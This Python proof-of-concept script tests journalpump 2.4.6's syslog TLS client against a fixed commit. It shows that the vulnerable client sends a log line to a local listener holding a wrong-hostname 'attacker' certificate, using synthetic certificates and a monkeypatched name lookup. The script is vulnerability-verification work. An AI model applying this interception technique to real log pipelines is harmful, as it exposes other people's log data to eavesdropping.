#!/usr/bin/env python3
"""
End-to-end PoC: journalpump 2.4.6 SyslogTcpClient omits TLS hostname verification.

Uses the REAL journalpump.rsyslog.SyslogTcpClient from:
  - vulnerable tag 2.4.6 @ 3e1b59c8
  - fixed commit     652975d (create_default_context + server_hostname; includes 766b860)

Local-only. Synthetic CA/certs. No external hosts.

Resolution: harness monkeypatches socket.getaddrinfo so the configured
hostname `logs.victim.test` resolves to 127.0.0.1 (documented; no /etc/hosts).
"""
from __future__ import annotations

import importlib.util
import socket
import ssl
import sys
import threading
import time
import traceback
from dataclasses import dataclass, field
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Callable

HERE = Path(__file__).resolve().parent
CERTS = HERE / "certs"
_TREE_VULN = HERE / "trees" / "v2.4.6" / "journalpump" / "rsyslog.py"
_TREE_FIX = HERE / "trees" / "fixed" / "journalpump" / "rsyslog.py"
_EV_VULN = HERE / "evidence" / "rsyslog_2.4.6.py"
_EV_FIX = HERE / "evidence" / "rsyslog_master.py"
TREE_VULN = _TREE_VULN if _TREE_VULN.is_file() else _EV_VULN
TREE_FIX = _TREE_FIX if _TREE_FIX.is_file() else _EV_FIX
OUT = HERE / "poc_e2e_results.txt"

CONFIGURED_HOST = "logs.victim.test"
MARKER = "C77-SYNTHETIC-LOG-LINE-DO-NOT-SUBMIT"


@dataclass
class CaseResult:
    name: str
    ok: bool
    detail: str
    received: bytes | None = None


@dataclass
class ListenerState:
    received: bytes | None = None
    error: str | None = None
    peer_sni: str | None = None
    done: threading.Event = field(default_factory=threading.Event)


def load_rsyslog(path: Path, module_name: str):
    """Load journalpump.rsyslog from a concrete file path (no site-packages mix-up)."""
    spec = importlib.util.spec_from_file_location(module_name, path)
    if spec is None or spec.loader is None:
        raise RuntimeError(f"cannot load {path}")
    mod = importlib.util.module_from_spec(spec)
    # rsyslog has no package-relative imports beyond stdlib
    sys.modules[module_name] = mod
    spec.loader.exec_module(mod)
    return mod


def make_server_ctx(cert: Path, key: Path) -> ssl.SSLContext:
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ctx.minimum_version = ssl.TLSVersion.TLSv1_2
    ctx.load_cert_chain(str(cert), str(key))
    return ctx


def start_tls_listener(cert: Path, key: Path, state: ListenerState) -> tuple[int, threading.Thread, socket.socket]:
    server_ctx = make_server_ctx(cert, key)
    ls = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ls.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    ls.bind(("127.0.0.1", 0))
    ls.listen(1)
    ls.settimeout(8.0)
    port = ls.getsockname()[1]

    def _run() -> None:
        conn = None
        ssock = None
        try:
            conn, _addr = ls.accept()
            ssock = server_ctx.wrap_socket(conn, server_side=True)
            try:
                state.peer_sni = ssock.server_hostname  # type: ignore[attr-defined]
            except Exception:
                state.peer_sni = None
            # Collect until client closes or timeout
            ssock.settimeout(3.0)
            chunks: list[bytes] = []
            while True:
                try:
                    data = ssock.recv(4096)
                except socket.timeout:
                    break
                if not data:
                    break
                chunks.append(data)
                if b"\n" in data:
                    break
            state.received = b"".join(chunks)
        except Exception as ex:
            state.error = f"{type(ex).__name__}: {ex}"
        finally:
            for s in (ssock, conn, ls):
                try:
                    if s is not None:
                        s.close()
                except Exception:
                    pass
            state.done.set()

    t = threading.Thread(target=_run, name=f"tls-listener-{port}", daemon=True)
    t.start()
    return port, t, ls


_real_getaddrinfo = socket.getaddrinfo


def install_host_remap(hostname: str, ipv4: str = "127.0.0.1") -> Callable:
    """Harness-only remap: hostname -> ipv4. Does not touch /etc/hosts."""

    def _fake(host, port, family=0, type=0, proto=0, flags=0):
        if host == hostname:
            host = ipv4
            # Prefer IPv4 for the loopback listener
            if family == 0:
                family = socket.AF_INET
        return _real_getaddrinfo(host, port, family, type, proto, flags)

    socket.getaddrinfo = _fake  # type: ignore[assignment]
    return _fake


def restore_getaddrinfo() -> None:
    socket.getaddrinfo = _real_getaddrinfo  # type: ignore[assignment]


def run_client(rsyslog_mod, port: int, ca_path: Path) -> tuple[bool, str]:
    """Instantiate real SyslogTcpClient and send one synthetic RFC5424 line."""
    client = None
    try:
        client = rsyslog_mod.SyslogTcpClient(
            server=CONFIGURED_HOST,
            port=port,
            rfc="RFC5424",
            protocol="SSL",
            cacerts=str(ca_path),
        )
        ts = datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")
        client.log(
            facility=1,
            severity=6,
            timestamp=ts,
            hostname="poc-host",
            program="c77-poc",
            pid=1,
            msgid="C77",
            msg=MARKER,
        )
        return True, "handshake+send ok"
    except Exception as ex:
        return False, f"{type(ex).__name__}: {ex}"
    finally:
        if client is not None:
            try:
                client.close()
            except Exception:
                pass


def run_case(
    *,
    name: str,
    rsyslog_mod,
    server_cert: Path,
    server_key: Path,
    expect_success: bool,
) -> CaseResult:
    state = ListenerState()
    port, thread, _ls = start_tls_listener(server_cert, server_key, state)
    time.sleep(0.05)
    ok_client, detail = run_client(rsyslog_mod, port, CERTS / "ca.crt")
    # Wait for listener to finish (or timeout)
    state.done.wait(timeout=6.0)
    thread.join(timeout=1.0)

    received = state.received
    marker_seen = bool(received and MARKER.encode() in received)

    if expect_success:
        passed = ok_client and marker_seen
        msg = (
            f"client={detail}; listener_err={state.error}; "
            f"recv={received!r}; sni={state.peer_sni!r}; marker={marker_seen}"
        )
        return CaseResult(name=name, ok=passed, detail=msg, received=received)

    # expect rejection (hostname mismatch)
    # Client should fail; listener may see TLS alert / handshake error; must NOT get marker
    rejected = (not ok_client) and (not marker_seen)
    # Require a real hostname-mismatch signal (not merely CERTIFICATE_VERIFY_FAILED
    # from an unrelated CA/policy failure).
    dlow = detail.lower()
    hostnameish = ("hostname" in dlow) or ("certificate is not valid for" in dlow)
    passed = rejected and hostnameish
    msg = (
        f"client={detail}; listener_err={state.error}; "
        f"recv={received!r}; sni={state.peer_sni!r}; "
        f"rejected={rejected}; hostname_error={hostnameish}"
    )
    return CaseResult(name=name, ok=passed, detail=msg, received=received)


def file_sha256(path: Path) -> str:
    import hashlib

    h = hashlib.sha256()
    with path.open("rb") as f:
        for chunk in iter(lambda: f.read(65536), b""):
            h.update(chunk)
    return h.hexdigest()


def main() -> int:
    lines: list[str] = []

    def log(s: str = "") -> None:
        print(s)
        lines.append(s)

    log("=== C77 E2E TLS hostname verification PoC ===")
    log(f"time_utc={datetime.now(timezone.utc).isoformat()}")
    log(f"python={sys.version.split()[0]}")
    log(f"openssl_mod={ssl.OPENSSL_VERSION}")
    log(f"vuln_rsyslog={TREE_VULN}")
    log(f"fix_rsyslog={TREE_FIX}")
    log(f"vuln_sha256={file_sha256(TREE_VULN)}")
    log(f"fix_sha256={file_sha256(TREE_FIX)}")
    log(f"ca_crt_sha256={file_sha256(CERTS / 'ca.crt')}")
    log(f"attacker_crt_sha256={file_sha256(CERTS / 'attacker.crt')}")
    log(f"victim_crt_sha256={file_sha256(CERTS / 'victim.crt')}")
    log(f"configured_server_hostname={CONFIGURED_HOST}")
    log("resolution=monkeypatch socket.getaddrinfo (harness only; NOT /etc/hosts)")
    log("marker=" + MARKER)
    log()

    # Sanity: context defaults mirror the two code paths
    ctx_old = ssl.SSLContext(ssl.PROTOCOL_TLS)
    ctx_old.verify_mode = ssl.CERT_REQUIRED
    ctx_new = ssl.create_default_context(cafile=str(CERTS / "ca.crt"))
    log(f"baseline SSLContext(PROTOCOL_TLS)+CERT_REQUIRED check_hostname={ctx_old.check_hostname}")
    log(f"baseline create_default_context check_hostname={ctx_new.check_hostname}")
    log()

    vuln = load_rsyslog(TREE_VULN, "jp_rsyslog_vuln")
    fixed = load_rsyslog(TREE_FIX, "jp_rsyslog_fixed")
    log(f"loaded SyslogTcpClient vuln from {vuln.__file__}")
    log(f"loaded SyslogTcpClient fixed from {fixed.__file__}")
    log()

    install_host_remap(CONFIGURED_HOST)
    results: list[CaseResult] = []
    try:
        cases = [
            (
                "VULN_2.4.6_mismatch_attacker_cert",
                vuln,
                CERTS / "attacker.crt",
                CERTS / "attacker.key",
                True,  # vulnerable: should SUCCEED against wrong-hostname cert
            ),
            (
                "FIXED_652975d_mismatch_attacker_cert",
                fixed,
                CERTS / "attacker.crt",
                CERTS / "attacker.key",
                False,  # fixed: must REJECT
            ),
            (
                "VULN_2.4.6_match_victim_cert_negctrl",
                vuln,
                CERTS / "victim.crt",
                CERTS / "victim.key",
                True,
            ),
            (
                "FIXED_652975d_match_victim_cert_negctrl",
                fixed,
                CERTS / "victim.crt",
                CERTS / "victim.key",
                True,
            ),
        ]
        for name, mod, cert, key, expect_ok in cases:
            log(f"--- CASE {name} (expect_success={expect_ok}) ---")
            try:
                res = run_case(
                    name=name,
                    rsyslog_mod=mod,
                    server_cert=cert,
                    server_key=key,
                    expect_success=expect_ok,
                )
            except Exception:
                res = CaseResult(name=name, ok=False, detail="CASE EXCEPTION\n" + traceback.format_exc())
            results.append(res)
            log(f"PASS={res.ok}")
            log(res.detail)
            log()
    finally:
        restore_getaddrinfo()

    all_pass = all(r.ok for r in results)
    vuln_confirmed = results[0].ok and results[1].ok  # mismatch succeeds on vuln, fails on fix
    log("=== SUMMARY ===")
    for r in results:
        log(f"{'OK' if r.ok else 'FAIL':4} {r.name}")
    log()
    if all_pass and vuln_confirmed:
        log("VERDICT: VULN CONFIRMED E2E")
        log(
            "journalpump 2.4.6 SyslogTcpClient completed TLS handshake and delivered "
            "the synthetic log to a listener presenting CN/SAN=attacker.invalid while "
            "configured for logs.victim.test; fixed 652975d rejected with hostname mismatch."
        )
        rc = 0
    else:
        log("VERDICT: NOT CONFIRMED / PoC FAILED")
        log("One or more cases did not match expectations. Do not submit.")
        rc = 1

    OUT.write_text("\n".join(lines) + "\n", encoding="utf-8")
    log(f"wrote {OUT}")
    return rc


if __name__ == "__main__":
    raise SystemExit(main())
